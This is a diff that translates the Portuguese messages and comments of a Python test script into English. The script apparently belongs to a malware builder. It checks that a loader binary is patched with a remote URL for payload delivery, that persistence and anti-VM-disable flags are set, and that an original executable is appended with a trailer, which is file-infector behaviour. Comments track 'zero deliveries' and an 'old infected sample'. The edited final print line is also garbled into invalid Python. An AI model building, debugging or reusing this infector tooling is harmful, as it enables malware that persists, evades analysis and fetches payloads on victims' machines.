@@ -44,58 +44,58 @@ def main():
     while i != -1:
         hits.append(i)
         i = raw.find(sent, i + 1)
-    check("sentinela presente no binario", bool(hits), "sentinel ausente")
-    check("o sentinela aparece duas vezes (array + constante memcmp)",
+    check("sentinel present in the binary", bool(hits), "sentinel absent")
+    check("the sentinel appears twice (array + memcmp constant)",
           len(hits) >= 2, hits)
 
     idx = peutil.find_sentinel(raw, sent, 256)
     other = [h for h in hits if h != idx]
-    print("[loader] array=%d  constante=%s" % (idx, other))
+    print("[loader] array=%d  constant=%s" % (idx, other))
 
     url = "http://192.168.18.74:9400/"
     patched = a._patch_loader(raw, url)
-    check("tamanho preservado", len(patched) == len(raw), "%d != %d" % (len(patched), len(raw)))
+    check("size preserved", len(patched) == len(raw), "%d != %d" % (len(patched), len(raw)))
 
     slot = patched[idx:idx + 256]
-    check("URL escrita no slot do array", slot.rstrip(b"\0") == url.encode(), slot[:40])
-    check("slot zero-preenchido", slot[len(url):] == b"\0" * (256 - len(url)))
-    # a regressao que custou zero entregas: patch escrevia na constante e o
-    # memcmp do loader parava de casar
-    check("constante de comparacao intacta", all(patched[o:o + len(sent)] == sent for o in other),
+    check("URL written into the array slot", slot.rstrip(b"\0") == url.encode(), slot[:40])
+    check("slot zero-padded", slot[len(url):] == b"\0" * (256 - len(url)))
+    # The regression that caused zero deliveries: the patch wrote to the constant and the
+    # Loader memcmp stopped matching
+    check("comparison constant intact", all(patched[o:o + len(sent)] == sent for o in other),
           [patched[o:o + len(sent)] for o in other])
 
-    # idempotencia: patchar de novo nao move nada nem duplica
+    # Idempotence: patching again neither moves nor duplicates anything.
     twice = a._patch_loader(patched, url)
-    check("patch idempotente", twice == patched)
+    check("patch idempotent", twice == patched)
 
-    # URL maior que o slot nao pode estourar
+    # URLs larger than the slot must not overflow it.
     long_url = "http://" + "a" * 400 + ":9400/"
     p2 = a._patch_loader(raw, long_url)
-    check("URL > 255 truncada sem estourar", len(p2) == len(raw) and
+    check("URL > 255 truncated without overflow", len(p2) == len(raw) and
           p2[idx:idx + 256].rstrip(b"\0") == long_url.encode()[:255])
 
-    # trailer [loader][host][len][MAGIC] e extraivel
+    # The [loader][host][len][MAGIC] trailer is extractable.
     host = b"MZ" + os.urandom(5000)
     infected = a._patch_loader(raw, url) + host + struct.pack("<I", len(host)) + a.MAGIC
     back = a._extract_original_host(infected)
-    check("host original recuperado do trailer", back == host, "%d bytes" % len(back))
+    check("original host recovered from the trailer", back == host, "%d bytes" % len(back))
 
-    # persist / no-anti-vm sentinelas: array trocado, imediato em .text nao
+    # Persist / no-anti-VM sentinels: patch the array, not the immediate in .text.
     pp = a._patch_loader(raw, url, persist=True, no_anti_vm=True)
     pidx = peutil.find_sentinel(raw, a.PERSIST_SENTINEL, 8)
     aidx = peutil.find_sentinel(raw, a.AV_SENTINEL, 8)
-    check("array persist trocado", pp[pidx:pidx + 8] == a.PERSIST_ENABLE, pp[pidx:pidx + 8])
-    check("array anti-vm trocado", pp[aidx:aidx + 8] == a.AV_DISABLE, pp[aidx:aidx + 8])
-    # as copias em .text sao imediatos do codigo: escrever nelas quebra o binario
+    check("persist array swapped", pp[pidx:pidx + 8] == a.PERSIST_ENABLE, pp[pidx:pidx + 8])
+    check("anti-VM array swapped", pp[aidx:aidx + 8] == a.AV_DISABLE, pp[aidx:aidx + 8])
+    # The .text copies are code immediates: writing to them breaks the binary.
     phits = [o for o in range(len(raw)) if raw.startswith(a.PERSIST_SENTINEL, o)]
     ahits = [o for o in range(len(raw)) if raw.startswith(a.AV_SENTINEL, o)]
-    check("imediato persist em .text intacto",
+    check("persist immediate in .text intact",
           all(pp[o:o + 8] == raw[o:o + 8] for o in phits if o != pidx), phits)
-    check("imediato anti-vm em .text intacto",
+    check("anti-VM immediate in .text intact",
           all(pp[o:o + 8] == raw[o:o + 8] for o in ahits if o != aidx), ahits)
-    check("persist/anti-vm nao mudam tamanho", len(pp) == len(raw))
+    check("persist/anti-VM do not change the size", len(pp) == len(raw))
 
-    # amostra antiga: confirma o loopback que causava o zero-delivery
+    # Old sample: confirms the loopback that caused zero deliveries.
     sample = os.path.join(REPO, "ifec", "apps")
     cands = [os.path.join(sample, f) for f in os.listdir(sample)] if os.path.isdir(sample) else []
     cands = [c for c in cands if os.path.getsize(c) > 200000]
@@ -110,12 +110,12 @@ def main():
             urls.add(blob[i:j].decode("ascii", "replace"))
             i = blob.find(b"http://", j)
         print("[sample] %s  urls=%s" % (os.path.basename(cands[0]), sorted(urls)[:4]))
-        check("amostra antiga embutia loopback",
+        check("old sample embedded loopback",
               any("127.0.0.1" in u or "localhost" in u for u in urls), sorted(urls))
     else:
-        print("[sample] sem amostra infectada em ifec/apps")
+        print("[sample] no infected sample in ifec/apps")
 
-    print("\n=== %d falhas ===" % len(fails))
+    print("\n"=== %d failures ==="" % len(fails))
     for f in fails:
         print("  - " + f)
     return 1 if fails else 0
